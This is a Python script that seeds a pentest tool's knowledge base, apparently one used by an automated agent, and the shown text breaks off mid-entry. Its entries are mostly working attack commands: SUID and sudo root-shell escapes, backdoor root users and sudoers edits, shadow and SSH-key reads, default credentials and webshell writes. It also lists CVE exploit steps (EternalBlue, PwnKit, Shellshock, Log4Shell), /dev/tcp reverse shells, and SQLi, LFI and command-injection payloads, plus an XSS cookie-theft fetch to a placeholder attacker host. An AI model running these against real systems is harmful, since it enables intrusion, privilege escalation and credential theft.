#!/usr/bin/env python3
"""Seed the KonR knowledge base with curated pentest reference material.

Run from the project root:
    python scripts/seed_knowledge.py
    # or
    make seed-knowledge

Idempotent — uses stable doc_ids; safe to re-run (entries are upserted).
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from konr.storage.memory import VectorMemory  # noqa: E402


ENTRIES: list[dict] = [

    # ── GTFOBins — SUID ───────────────────────────────────────────────────────

    {
        "id": "gtfobins-bash-suid",
        "content": (
            "GTFOBins: bash with SUID bit\n"
            "Condition: find / -perm -4000 -name bash 2>/dev/null returns a result\n"
            "Command: bash -p\n"
            "Result: Effective UID becomes root. -p disables automatic privilege dropping.\n"
            "Also works with: /bin/sh -p if sh has SUID"
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "bash"},
    },
    {
        "id": "gtfobins-python3-suid",
        "content": (
            "GTFOBins: python3 with SUID bit\n"
            "Condition: find / -perm -4000 -name python* 2>/dev/null returns a result\n"
            "Command: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n"
            "Also works for python2: python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n"
            "Result: Root shell"
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "python3"},
    },
    {
        "id": "gtfobins-perl-suid",
        "content": (
            "GTFOBins: perl with SUID bit\n"
            "Condition: find / -perm -4000 -name perl 2>/dev/null\n"
            "Command: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'\n"
            "Result: Root shell"
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "perl"},
    },
    {
        "id": "gtfobins-ruby-suid",
        "content": (
            "GTFOBins: ruby with SUID bit\n"
            "Condition: find / -perm -4000 -name ruby 2>/dev/null\n"
            "Command: ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'\n"
            "Result: Root shell"
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "ruby"},
    },
    {
        "id": "gtfobins-find-suid",
        "content": (
            "GTFOBins: find with SUID bit\n"
            "Condition: find / -perm -4000 -name find 2>/dev/null\n"
            "Command: find . -exec /bin/bash -p \\; -quit\n"
            "Result: Root shell via -exec flag"
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "find"},
    },
    {
        "id": "gtfobins-vim-suid",
        "content": (
            "GTFOBins: vim with SUID bit\n"
            "Condition: find / -perm -4000 -name vim 2>/dev/null\n"
            "Command: vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/bash\",\"bash\",\"-p\")'\n"
            "Alternative: vim -c ':!/bin/bash -p'\n"
            "Result: Root shell or root file read"
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "vim"},
    },
    {
        "id": "gtfobins-nmap-suid",
        "content": (
            "GTFOBins: nmap with SUID bit (old nmap with --interactive)\n"
            "Condition: find / -perm -4000 -name nmap 2>/dev/null; nmap version < 5.21\n"
            "Command: nmap --interactive\n"
            "Then at nmap> prompt: !sh\n"
            "Result: Root shell. Newer nmap does not have --interactive."
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "nmap"},
    },
    {
        "id": "gtfobins-awk-suid",
        "content": (
            "GTFOBins: awk with SUID bit\n"
            "Condition: find / -perm -4000 -name awk 2>/dev/null\n"
            "Command: awk 'BEGIN {system(\"/bin/bash -p\")}'\n"
            "Result: Root shell"
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "awk"},
    },
    {
        "id": "gtfobins-env-suid",
        "content": (
            "GTFOBins: env with SUID bit\n"
            "Condition: find / -perm -4000 -name env 2>/dev/null\n"
            "Command: env /bin/bash -p\n"
            "Result: Root shell"
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "env"},
    },
    {
        "id": "gtfobins-less-suid",
        "content": (
            "GTFOBins: less / more with SUID bit\n"
            "Condition: find / -perm -4000 \\( -name less -o -name more \\) 2>/dev/null\n"
            "Command: less /etc/passwd\n"
            "Then at the less prompt type: !/bin/bash -p\n"
            "Result: Root shell via shell escape"
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "less"},
    },
    {
        "id": "gtfobins-tee-suid",
        "content": (
            "GTFOBins: tee with SUID bit (file write)\n"
            "Condition: find / -perm -4000 -name tee 2>/dev/null\n"
            "Use for arbitrary file write as root:\n"
            "  echo 'root2:x:0:0::/root:/bin/bash' | tee -a /etc/passwd\n"
            "  echo 'user ALL=(ALL) NOPASSWD:ALL' | tee -a /etc/sudoers\n"
            "Result: Write arbitrary files as root; add new root user or sudo entry"
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "tee"},
    },
    {
        "id": "gtfobins-cp-suid",
        "content": (
            "GTFOBins: cp with SUID bit (file copy as root)\n"
            "Condition: find / -perm -4000 -name cp 2>/dev/null\n"
            "Read /etc/shadow: cp /etc/shadow /tmp/shadow && cat /tmp/shadow\n"
            "Overwrite /etc/passwd: cp /tmp/mypasswd /etc/passwd\n"
            "Result: Arbitrary file read/write as root"
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "cp"},
    },
    {
        "id": "gtfobins-cat-suid",
        "content": (
            "GTFOBins: cat with SUID bit (file read)\n"
            "Condition: find / -perm -4000 -name cat 2>/dev/null\n"
            "Command: cat /etc/shadow\n"
            "cat /root/root.txt  (flag read)\n"
            "cat /root/.ssh/id_rsa  (key exfil)\n"
            "Result: Arbitrary file read as root"
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "cat"},
    },
    {
        "id": "gtfobins-nano-suid",
        "content": (
            "GTFOBins: nano with SUID bit\n"
            "Condition: find / -perm -4000 -name nano 2>/dev/null\n"
            "Read shadow: nano /etc/shadow\n"
            "Add root user: nano /etc/passwd → append: evil:x:0:0::/root:/bin/bash\n"
            "Shell escape: Ctrl+R then Ctrl+X → enter command\n"
            "Result: File read/write or command execution as root"
        ),
        "metadata": {"category": "privesc", "technique": "suid", "tool": "nano"},
    },
    {
        "id": "gtfobins-capabilities",
        "content": (
            "Linux capabilities escalation\n"
            "Detection: getcap -r / 2>/dev/null\n"
            "Dangerous capabilities:\n"
            "  cap_setuid+ep on python3: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n"
            "  cap_setuid+ep on perl: perl -e 'use POSIX; POSIX::setuid(0); exec \"/bin/bash\"'\n"
            "  cap_net_raw: can sniff network traffic\n"
            "  cap_dac_override: bypass file permissions\n"
            "  cap_sys_admin: mount filesystems, can lead to container escape"
        ),
        "metadata": {"category": "privesc", "technique": "capabilities", "tool": "getcap"},
    },

    # ── GTFOBins — sudo NOPASSWD ──────────────────────────────────────────────

    {
        "id": "sudo-bash",
        "content": (
            "GTFOBins: bash via sudo\n"
            "Condition: sudo -l shows (root) NOPASSWD: /bin/bash\n"
            "Command: sudo bash\n"
            "Result: Root shell"
        ),
        "metadata": {"category": "privesc", "technique": "sudo", "tool": "bash"},
    },
    {
        "id": "sudo-python3",
        "content": (
            "GTFOBins: python3 via sudo\n"
            "Condition: sudo -l shows (root) NOPASSWD: /usr/bin/python3\n"
            "Command: sudo python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
            "Result: Root shell"
        ),
        "metadata": {"category": "privesc", "technique": "sudo", "tool": "python3"},
    },
    {
        "id": "sudo-find",
        "content": (
            "GTFOBins: find via sudo\n"
            "Condition: sudo -l shows (root) NOPASSWD: /usr/bin/find\n"
            "Command: sudo find / -exec /bin/bash \\; -quit\n"
            "Result: Root shell via exec"
        ),
        "metadata": {"category": "privesc", "technique": "sudo", "tool": "find"},
    },
    {
        "id": "sudo-vim",
        "content": (
            "GTFOBins: vim via sudo\n"
            "Condition: sudo -l shows (root) NOPASSWD: /usr/bin/vim\n"
            "Command: sudo vim -c ':!/bin/bash'\n"
            "Alternative: sudo vim /etc/sudoers (edit directly)\n"
            "Result: Root shell"
        ),
        "metadata": {"category": "privesc", "technique": "sudo", "tool": "vim"},
    },
    {
        "id": "sudo-less",
        "content": (
            "GTFOBins: less via sudo\n"
            "Condition: sudo -l shows (root) NOPASSWD: /usr/bin/less\n"
            "Command: sudo less /etc/passwd\n"
            "At prompt type: !/bin/bash\n"
            "Result: Root shell via shell escape"
        ),
        "metadata": {"category": "privesc", "technique": "sudo", "tool": "less"},
    },
    {
        "id": "sudo-awk",
        "content": (
            "GTFOBins: awk via sudo\n"
            "Condition: sudo -l shows (root) NOPASSWD: /usr/bin/awk\n"
            "Command: sudo awk 'BEGIN {system(\"/bin/bash\")}'\n"
            "Result: Root shell"
        ),
        "metadata": {"category": "privesc", "technique": "sudo", "tool": "awk"},
    },
    {
        "id": "sudo-nmap",
        "content": (
            "GTFOBins: nmap via sudo\n"
            "Condition: sudo -l shows (root) NOPASSWD: /usr/bin/nmap\n"
            "Old nmap (<5.21): sudo nmap --interactive → !sh\n"
            "New nmap: echo 'os.execute(\"/bin/bash\")' > /tmp/nmap.nse && sudo nmap --script /tmp/nmap.nse\n"
            "Result: Root shell"
        ),
        "metadata": {"category": "privesc", "technique": "sudo", "tool": "nmap"},
    },
    {
        "id": "sudo-tee",
        "content": (
            "GTFOBins: tee via sudo (file write)\n"
            "Condition: sudo -l shows (root) NOPASSWD: /usr/bin/tee\n"
            "Add to sudoers: echo 'currentuser ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers\n"
            "Then: sudo bash\n"
            "Result: Full sudo without password"
        ),
        "metadata": {"category": "privesc", "technique": "sudo", "tool": "tee"},
    },
    {
        "id": "sudo-perl",
        "content": (
            "GTFOBins: perl via sudo\n"
            "Condition: sudo -l shows (root) NOPASSWD: /usr/bin/perl\n"
            "Command: sudo perl -e 'exec \"/bin/bash\"'\n"
            "Result: Root shell"
        ),
        "metadata": {"category": "privesc", "technique": "sudo", "tool": "perl"},
    },
    {
        "id": "sudo-env-ld-preload",
        "content": (
            "sudo env LD_PRELOAD privilege escalation\n"
            "Condition: sudo -l shows env_keep+=LD_PRELOAD AND any sudo command allowed\n"
            "Steps:\n"
            "  1. Create /tmp/pe.c:\n"
            "     #include<stdio.h>\\n#include<unistd.h>\\nvoid _init(){setuid(0);setgid(0);system(\"/bin/bash\");}\n"
            "  2. gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c\n"
            "  3. sudo LD_PRELOAD=/tmp/pe.so <any_allowed_command>\n"
            "Result: Root shell via shared library injection"
        ),
        "metadata": {"category": "privesc", "technique": "sudo", "tool": "ld_preload"},
    },

    # ── Default Credentials ───────────────────────────────────────────────────

    {
        "id": "default-creds-ftp",
        "content": (
            "Default credentials: FTP\n"
            "Always try anonymous FTP first:\n"
            "  ftp <host>  →  username: anonymous  →  password: anything@email.com\n"
            "Common defaults: admin:admin, admin:password, ftp:ftp, root:root\n"
            "Check for anonymous with: nmap -sV --script ftp-anon -p 21 <host>\n"
            "List files: ls -la; get files: get <filename>"
        ),
        "metadata": {"category": "default-creds", "service": "ftp", "port": "21"},
    },
    {
        "id": "default-creds-ssh",
        "content": (
            "Default credentials: SSH\n"
            "Common defaults: root:root, root:toor, admin:admin, pi:raspberry (Raspberry Pi)\n"
            "ubuntu:ubuntu (AWS Ubuntu AMIs), vagrant:vagrant (Vagrant VMs)\n"
            "Brute force (requires approval): hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<host>\n"
            "Key-based: check /home/*/.ssh/authorized_keys for hints on valid users\n"
            "Also check /etc/ssh/sshd_config for PermitRootLogin and PasswordAuthentication"
        ),
        "metadata": {"category": "default-creds", "service": "ssh", "port": "22"},
    },
    {
        "id": "default-creds-mysql",
        "content": (
            "Default credentials: MySQL / MariaDB\n"
            "Common defaults: root: (blank password), root:root, root:mysql\n"
            "Connect: mysql -h <host> -u root -p\n"
            "List databases: SHOW DATABASES;\n"
            "Read files (if FILE privilege): SELECT LOAD_FILE('/etc/passwd');\n"
            "Write files: SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\n"
            "Nmap check: nmap --script mysql-empty-password -p 3306 <host>"
        ),
        "metadata": {"category": "default-creds", "service": "mysql", "port": "3306"},
    },
    {
        "id": "default-creds-mssql",
        "content": (
            "Default credentials: MSSQL (Microsoft SQL Server)\n"
            "Common defaults: sa: (blank), sa:sa, sa:password\n"
            "Connect: mssqlclient.py <domain>/<user>:<pass>@<host>\n"
            "Enable xp_cmdshell: EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n"
            "           EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\n"
            "Run OS command: EXEC xp_cmdshell 'whoami';\n"
            "Nmap: nmap --script ms-sql-empty-password -p 1433 <host>"
        ),
        "metadata": {"category": "default-creds", "service": "mssql", "port": "1433"},
    },
    {
        "id": "default-creds-postgres",
        "content": (
            "Default credentials: PostgreSQL\n"
            "Common defaults: postgres:postgres, postgres: (blank)\n"
            "Connect: psql -h <host> -U postgres\n"
            "List databases: \\l\n"
            "Execute OS commands (if superuser): COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;\n"
            "Read file: COPY /etc/passwd TO STDOUT;\n"
            "Nmap: nmap --script pgsql-brute -p 5432 <host>"
        ),
        "metadata": {"category": "default-creds", "service": "postgresql", "port": "5432"},
    },
    {
        "id": "default-creds-redis",
        "content": (
            "Default credentials: Redis\n"
            "Often unauthenticated with no password required\n"
            "Connect: redis-cli -h <host>\n"
            "Check auth: AUTH password (try common passwords or blank)\n"
            "Dump keys: KEYS *  →  GET <key>\n"
            "Write files: CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php;\n"
            "             SET payload '<?php system($_GET[\"cmd\"]); ?>';\n"
            "             SAVE;\n"
            "Write SSH key: CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys;\n"
            "               SET mykey '<your_public_key>'; SAVE;"
        ),
        "metadata": {"category": "default-creds", "service": "redis", "port": "6379"},
    },
    {
        "id": "default-creds-mongodb",
        "content": (
            "Default credentials: MongoDB\n"
            "Often runs unauthenticated on port 27017\n"
            "Connect: mongosh <host>:27017  or  mongo <host>:27017\n"
            "List DBs: show dbs\n"
            "Dump collection: use <db>; db.users.find()\n"
            "Check for credentials in collections — often stores plaintext passwords"
        ),
        "metadata": {"category": "default-creds", "service": "mongodb", "port": "27017"},
    },
    {
        "id": "default-creds-snmp",
        "content": (
            "Default credentials: SNMP\n"
            "Common community strings: public, private, community, manager\n"
            "Enumerate (v1/v2c): snmpwalk -v2c -c public <host>\n"
            "Enumerate users: snmpwalk -v1 -c public <host> 1.3.6.1.4.1.77.1.2.25\n"
            "Enumerate network: snmpwalk -v1 -c public <host> 1.3.6.1.2.1.4.34\n"
            "Brute community strings: onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <host>"
        ),
        "metadata": {"category": "default-creds", "service": "snmp", "port": "161"},
    },
    {
        "id": "default-creds-smb",
        "content": (
            "Default credentials: SMB / Windows\n"
            "Try null sessions: smbclient -N -L //<host>/\n"
            "Guest access: smbclient -U guest -N //<host>/\n"
            "Common defaults: Administrator: (blank), admin:admin, guest: (blank)\n"
            "Enumerate shares: crackmapexec smb <host> -u '' -p ''\n"
            "Check for guest: crackmapexec smb <host> -u 'guest' -p ''"
        ),
        "metadata": {"category": "default-creds", "service": "smb", "port": "445"},
    },
    {
        "id": "default-creds-web-admin",
        "content": (
            "Default credentials: Common web admin panels\n"
            "WordPress: admin:admin, admin:password — login at /wp-admin\n"
            "Drupal: admin:admin — login at /user/login\n"
            "Joomla: admin:admin — login at /administrator\n"
            "Tomcat: admin:admin, tomcat:tomcat, manager:manager — at /manager/html\n"
            "Jenkins: admin:admin, admin: (blank) — at /login\n"
            "Grafana: admin:admin — at /login\n"
            "phpMyAdmin: root: (blank), root:root — at /phpmyadmin\n"
            "Webmin: admin:admin — at port 10000"
        ),
        "metadata": {"category": "default-creds", "service": "web", "port": "80,443,8080"},
    },

    # ── Common CVEs ───────────────────────────────────────────────────────────

    {
        "id": "cve-vsftpd-234",
        "content": (
            "CVE: vsftpd 2.3.4 backdoor\n"
            "Affected: vsftpd 2.3.4 on port 21\n"
            "Detection: nmap -sV on port 21 shows 'vsftpd 2.3.4'\n"
            "How it works: Logging in with a username containing ':)' triggers a backdoor shell on port 6200\n"
            "Exploit:\n"
            "  nc <host> 21  →  USER \":)\"  →  PASS anything  →  nc <host> 6200\n"
            "Metasploit: use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <host>; run\n"
            "Result: Root shell on port 6200"
        ),
        "metadata": {"category": "cve", "cve": "N/A", "service": "ftp", "port": "21"},
    },
    {
        "id": "cve-ms17-010-eternalblue",
        "content": (
            "CVE: MS17-010 EternalBlue (SMBv1 RCE)\n"
            "Affected: Windows 7, Server 2008, unpatched Windows 10 — SMBv1 on port 445\n"
            "Detection: nmap --script smb-vuln-ms17-010 -p 445 <host>\n"
            "Metasploit:\n"
            "  use exploit/windows/smb/ms17_010_eternalblue\n"
            "  set RHOSTS <host>; set LHOST <attacker>; set PAYLOAD windows/x64/meterpreter/reverse_tcp\n"
            "  run\n"
            "Result: SYSTEM shell. No credentials needed.\n"
            "Note: Often detected by AV — try ms17_010_psexec module as alternative"
        ),
        "metadata": {"category": "cve", "cve": "CVE-2017-0144", "service": "smb", "port": "445"},
    },
    {
        "id": "cve-2021-4034-pwnkit",
        "content": (
            "CVE: CVE-2021-4034 PwnKit (polkit pkexec LPE)\n"
            "Affected: All Linux distros with polkit < 0.120 (before Jan 2022 patches)\n"
            "Detection: pkexec --version; dpkg -l policykit-1 (check version)\n"
            "Exploit:\n"
            "  git clone https://github.com/ly4k/PwnKit; cd PwnKit; make; ./PwnKit\n"
            "  OR: curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit; chmod +x PwnKit; ./PwnKit\n"
            "Result: Instant root shell on vulnerable systems\n"
            "Note: Widely patched — check kernel/package versions first"
        ),
        "metadata": {"category": "cve", "cve": "CVE-2021-4034", "service": "local", "port": "N/A"},
    },
    {
        "id": "cve-2014-6271-shellshock",
        "content": (
            "CVE: CVE-2014-6271 Shellshock (bash RCE)\n"
            "Affected: bash < 4.3 patch 25 — CGI scripts, DHCP clients, SSH ForceCommand\n"
            "Test: curl -H 'User-Agent: () { :; }; echo Content-Type: text/html; echo; /usr/bin/id' http://<host>/cgi-bin/test.cgi\n"
            "Exploit headers to try: User-Agent, Referer, Cookie, X-Forwarded-For\n"
            "Metasploit: use exploit/multi/http/apache_mod_cgi_bash_env_exec\n"
            "Reverse shell payload: () { :; }; /bin/bash -i >& /dev/tcp/<attacker>/<port> 0>&1"
        ),
        "metadata": {"category": "cve", "cve": "CVE-2014-6271", "service": "bash/cgi", "port": "80"},
    },
    {
        "id": "cve-2021-44228-log4shell",
        "content": (
            "CVE: CVE-2021-44228 Log4Shell (Log4j RCE)\n"
            "Affected: Apache Log4j 2.0-beta9 to 2.14.1 (Java applications)\n"
            "Detection: Any Java app accepting user input logged via Log4j\n"
            "Payload: ${jndi:ldap://<attacker>:389/a}\n"
            "Inject in: URL parameters, headers (User-Agent, X-Forwarded-For, Authorization), form fields\n"
            "Test: ${jndi:ldap://<your_burp_collaborator>/test} — check for DNS callback\n"
            "Tool: java -jar JNDI-Exploit-Kit.jar (setup LDAP server + payload)\n"
            "Result: RCE as the user running the Java application"
        ),
        "metadata": {"category": "cve", "cve": "CVE-2021-44228", "service": "java", "port": "80,443,8080"},
    },
    {
        "id": "cve-2021-3156-baron-samedit",
        "content": (
            "CVE: CVE-2021-3156 Baron Samedit (sudo heap overflow LPE)\n"
            "Affected: sudo < 1.9.5p2 — check with: sudoedit -s /\n"
            "If vulnerable: prints 'usage: sudoedit' (not a syntax error)\n"
            "Exploit: https://github.com/blasty/CVE-2021-3156\n"
            "  git clone https://github.com/blasty/CVE-2021-3156; cd CVE-2021-3156; make\n"
            "  ./sudo-hax-me-a-sandwich 0  (try different targets: 0, 1, 2)\n"
            "Result: Root shell without knowing any password"
        ),
        "metadata": {"category": "cve", "cve": "CVE-2021-3156", "service": "local", "port": "N/A"},
    },
    {
        "id": "cve-2016-5195-dirtycow",
        "content": (
            "CVE: CVE-2016-5195 Dirty COW (kernel race condition LPE)\n"
            "Affected: Linux kernel < 4.8.3 (many older systems, containers)\n"
            "Detection: uname -r — if < 4.8.3, potentially vulnerable\n"
            "Exploit variants:\n"
            "  dirtyc0w.c — overwrites /proc/self/mem to patch /etc/passwd\n"
            "  cowroot.c — creates SUID root shell\n"
            "Download: https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c\n"
            "Compile: gcc -pthread dirtyc0w.c -o dirtyc0w -lcrypt\n"
            "Result: Local privilege escalation to root"
        ),
        "metadata": {"category": "cve", "cve": "CVE-2016-5195", "service": "local", "port": "N/A"},
    },
    {
        "id": "cve-2014-0160-heartbleed",
        "content": (
            "CVE: CVE-2014-0160 OpenSSL Heartbleed (memory disclosure)\n"
            "Affected: OpenSSL 1.0.1 through 1.0.1f\n"
            "Detection: nmap --script ssl-heartbleed -p 443 <host>\n"
            "Manual test: python heartbleed.py <host> 443\n"
            "Metasploit: use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS <host>; run\n"
            "Leaks: session tokens, private keys, passwords, user data from server memory\n"
            "Result: Information disclosure — may reveal credentials or session tokens"
        ),
        "metadata": {"category": "cve", "cve": "CVE-2014-0160", "service": "ssl/tls", "port": "443"},
    },
    {
        "id": "cve-2015-3306-proftpd",
        "content": (
            "CVE: CVE-2015-3306 ProFTPd mod_copy (unauthenticated file copy)\n"
            "Affected: ProFTPd 1.3.5 with mod_copy enabled\n"
            "Detection: nmap -sV port 21 shows 'ProFTPD 1.3.5'\n"
            "Exploit: SITE CPFR and SITE CPTO commands work without authentication\n"
            "  nc <host> 21\n"
            "  SITE CPFR /etc/passwd\n"
            "  SITE CPTO /var/www/html/passwd.txt\n"
            "  curl http://<host>/passwd.txt\n"
            "Write webshell: SITE CPFR /proc/self/cmdline; SITE CPTO /var/www/html/shell.php\n"
            "Metasploit: use exploit/unix/ftp/proftpd_modcopy_exec"
        ),
        "metadata": {"category": "cve", "cve": "CVE-2015-3306", "service": "ftp", "port": "21"},
    },
    {
        "id": "cve-2021-1675-printnightmare",
        "content": (
            "CVE: CVE-2021-1675 PrintNightmare (Windows Print Spooler RCE/LPE)\n"
            "Affected: Windows with Print Spooler service (default ON)\n"
            "Detection: rpcdump.py @<host> | findstr 'MS-RPRN'\n"
            "Remote exploit (LPE → SYSTEM):\n"
            "  python3 CVE-2021-1675.py <domain>/<user>:<pass>@<host> '\\\\<attacker>\\share\\shell.dll'\n"
            "Local exploit: SpoolFool or PrintNightmare.exe\n"
            "Metasploit: use exploit/windows/dcerpc/cve_2021_1675_printnightmare\n"
            "Result: SYSTEM or local privilege escalation"
        ),
        "metadata": {"category": "cve", "cve": "CVE-2021-1675", "service": "spooler", "port": "445"},
    },

    # ── Web Attack Patterns ───────────────────────────────────────────────────

    {
        "id": "web-sqli-auth-bypass",
        "content": (
            "SQL Injection: authentication bypass payloads\n"
            "Basic: ' OR '1'='1  /  ' OR 1=1 --  /  ' OR 'x'='x\n"
            "Comment styles: --  /*  #  (use # for MySQL)\n"
            "Always-true: 1'OR'1'='1  /  admin'--  /  ' OR 1=1#\n"
            "Union-based test: ' UNION SELECT 1,2,3--\n"
            "Error-based (MySQL): ' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--\n"
            "Time-based blind (MySQL): ' AND SLEEP(5)--\n"
            "Time-based blind (MSSQL): '; WAITFOR DELAY '0:0:5'--\n"
            "Use sqlmap for automation: sqlmap -u '<url>' --forms --dbs (requires approval)"
        ),
        "metadata": {"category": "web", "technique": "sqli", "tool": "manual"},
    },
    {
        "id": "web-lfi-paths",
        "content": (
            "Local File Inclusion (LFI): common paths to try\n"
            "Linux files: /etc/passwd  /etc/shadow  /etc/hosts  /proc/self/environ\n"
            "              /var/log/apache2/access.log  /var/log/auth.log\n"
            "Path traversal: ../../../etc/passwd  /....//....//etc/passwd\n"
            "PHP wrappers: php://filter/convert.base64-encode/resource=index.php\n"
            "              php://input (for RCE via POST)\n"
            "              data://text/plain;base64,<base64_payload>\n"
            "Null byte bypass (PHP < 5.3): ../../../../etc/passwd%00\n"
            "Log poisoning: poison User-Agent in access.log, then include log file"
        ),
        "metadata": {"category": "web", "technique": "lfi", "tool": "manual"},
    },
    {
        "id": "web-file-upload-bypass",
        "content": (
            "File upload bypass techniques\n"
            "Change extension: .php → .php5, .phtml, .pHp, .php.jpg\n"
            "Magic bytes: add GIF89a; to start of PHP file, name it shell.php.gif\n"
            "Content-Type bypass: change MIME type to image/jpeg in Burp while keeping .php extension\n"
            "Null byte: shell.php%00.jpg\n"
            "Double extension: shell.jpg.php\n"
            "htaccess trick: upload .htaccess with 'AddType application/x-httpd-php .jpg'\n"
            "EXIF injection: embed PHP in EXIF comment field, upload as real .jpg\n"
            "After upload: check /uploads/, /files/, /images/ for the shell"
        ),
        "metadata": {"category": "web", "technique": "file-upload", "tool": "manual"},
    },
    {
        "id": "web-xss-payloads",
        "content": (
            "Cross-Site Scripting (XSS): basic test payloads\n"
            "Basic: <script>alert(1)</script>\n"
            "Attribute injection: \" onmouseover=\"alert(1)\n"
            "JS event: <img src=x onerror=alert(1)>\n"
            "SVG: <svg onload=alert(1)>\n"
            "Filter bypass: <ScRiPt>alert(1)</ScRiPt>  /  <img/src=x onerror=alert(1)>\n"
            "Cookie steal: <script>fetch('http://<attacker>/?c='+document.cookie)</script>\n"
            "DOM XSS: look for location.hash, document.write, innerHTML in JS source\n"
            "Tool: dalfox url '<url>' (requires approval)"
        ),
        "metadata": {"category": "web", "technique": "xss", "tool": "manual"},
    },
    {
        "id": "web-command-injection",
        "content": (
            "OS Command Injection: test payloads\n"
            "Separator chars: ;  &&  ||  |  `  $(...)\n"
            "Basic test: ; id  && id  | id  `id`  $(id)\n"
            "Blind (time-based): ; sleep 5\n"
            "Out-of-band: ; curl http://<attacker>:8080/$(id)\n"
            "Reverse shell: ; bash -c 'bash -i >& /dev/tcp/<attacker>/<port> 0>&1'\n"
            "URL encoded: %3B+id  %26%26+id\n"
            "Look for: ping, host lookup, DNS queries, file conversion, report generation fields"
        ),
        "metadata": {"category": "web", "technique": "cmdi", "tool": "manual"},
    },
    {
        "id": "web-ssrf-payloads",
        "content": (
            "Server-Side Request Forgery (SSRF): test payloads\n"
            "Target internal services: http://127.0.0.1/<path>  http://localhost/\n"
            "Cloud metadata: http://169.254.169.254/latest/meta-data/ (AWS)\n"
            "               http://169.254.169.254/computeMetadata/v1/ (GCP, add header)\n"
            "               http://169.254.169.254/metadata/instance (Azure)\n"
            "Bypass filters: http://0.0.0.0/  http://2130706433/ (decimal 127.0.0.1)\n"
            "               http://127.1/  http://[::1]/  http://spoofed.domain@127.0.0.1/\n"
            "Protocol escalation: dict://  gopher://  file:///etc/passwd\n"
            "Internal port scan: test http://127.0.0.1:<port>/ for each port"
        ),
        "metadata": {"category": "web", "technique": "ssrf", "tool": "manual"},
    },
    {
        "id": "web-idor-access-control",
        "content": (
            "Insecure Direct Object Reference (IDOR) and broken access control\n"
            "Test: change numeric IDs in URLs, API calls, form params: ?id=1 → ?id=2\n"
            "Try: other user IDs, negative IDs, zero, GUIDs from other responses\n"
            "Horizontal escalation: access another user's data with same privilege\n"
            "Vertical escalation: access admin endpoints as regular user\n"
            "Test admin endpoints: /admin, /api/admin/, /management, /console\n"
            "Role bypass: change role in JWT, cookie, request param, or hidden form field\n"
            "HTTP method bypass: try GET vs POST vs PUT vs DELETE on restricted endpoints\n"
            "Header bypass: X-Original-URL: /admin  X-Rewrite-URL: /admin  X-Custom-IP-Authorization: 127.0.0.1"
        ),
        "metadata": {"category": "web", "technique": "idor", "tool": "manual"},
    },
    {
        "id": "web-directory-traversal",
        "content": (
            "Directory traversal and content discovery\n"
            "Common wordlists in container:\n"
            "  /usr/share/seclists/Discovery/Web-Content/common.txt\n"
            "  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n"
            "  /usr/share/wordlists/dirb/common.txt\n"
            "ffuf: ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<host>/FUZZ\n"
            "feroxbuster: feroxbuster -u http://<host>/ -w <wordlist> --depth 2\n"
            "gobuster: gobuster dir -u http://<host>/ -w <wordlist> -x php,html,txt\n"
            "API endpoints: /api/v1/, /api/v2/, /swagger.json, /api-docs, /.well-known/\n"
            "Backup files: .bak, .old, .orig, ~, .swp"
        ),
        "metadata": {"category": "web", "technique": "discovery", "tool": "ffuf"},
    },

    # ── Active Directory Attacks ──────────────────────────────────────────────

    {
        "id": "ad-asreproasting",
        "content": (
            "Active Directory: AS-REP Roasting\n"
            "Condition: User has 'Do not require Kerberos preauthentication' enabled (UF_DONT_REQUIRE_PREAUTH)\n"
            "No credentials needed — only usernames\n"
            "Enumerate vulnerable users:\n"
            "  GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc_ip> -format hashcat\n"
            "With credentials:\n"
            "  GetNPUsers.py <domain>/<user>:<pass> -request -dc-ip <dc_ip> -format hashcat\n"
            "Crack offline:\n"
            "  hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt\n"
            "Result: Domain user credentials if hash cracks"
        ),
        "metadata": {"category": "ad", "technique": "asreproasting", "tool": "impacket"},
    },
    {
        "id": "ad-kerberoasting",
        "content": (
            "Active Directory: Kerberoasting\n"
            "Condition: Any valid domain user + service account with SPN set\n"
            "Request TGS tickets:\n"
            "  GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile spn_hashes.txt\n"
            "Crack offline:\n"
